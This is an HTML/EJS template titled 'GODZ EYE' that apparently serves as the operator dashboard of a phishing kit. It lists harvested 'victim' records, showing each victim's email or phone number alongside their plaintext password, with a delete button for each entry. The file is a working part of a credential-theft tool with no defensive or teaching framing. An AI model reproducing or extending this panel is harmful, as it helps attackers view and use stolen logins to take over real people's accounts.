<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Control the color of the mobile browser -->
    <meta name="theme-color" content="#1f2125"> 
    <title>gods eye</title>
    <link rel="icon" href="/uploads/favicon.png" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css" rel="stylesheet" />
    <link rel="stylesheet" href="/css/view-victim.css">
</head>

<body>

    <div class="gods-eye">
        <h2>GODZ EYE</h2>

        <a href="/dashboard" class="back-to-dashboard"><i class="ri-links-line"></i></a>

        <ul>
            <% if (victims && victims.length> 0) { %>
                <% victims.forEach(victim=> { %>
                    <li>
                        <div class="details">
                            <strong>Email or Number<p>
                                    <%= victim.emailOrNumber %>
                                </p></strong>
                            <strong>Password<p>
                                    <%= victim.password %>
                                </p></strong>
                        </div>

                        <form action="/delete-victim/<%= victim._id %>" method="POST" style="display:inline;">
                            <button type="submit">Delete</button>
                        </form>
                    </li>
                    <% }); %>
                        <% } else { %>
                            <p>No victim data found...</p>
                            <% } %>
        </ul>
    </div>



    <script src="https://kit.fontawesome.com/b3fa93e021.js" crossorigin="anonymous"></script>
</body>

</html>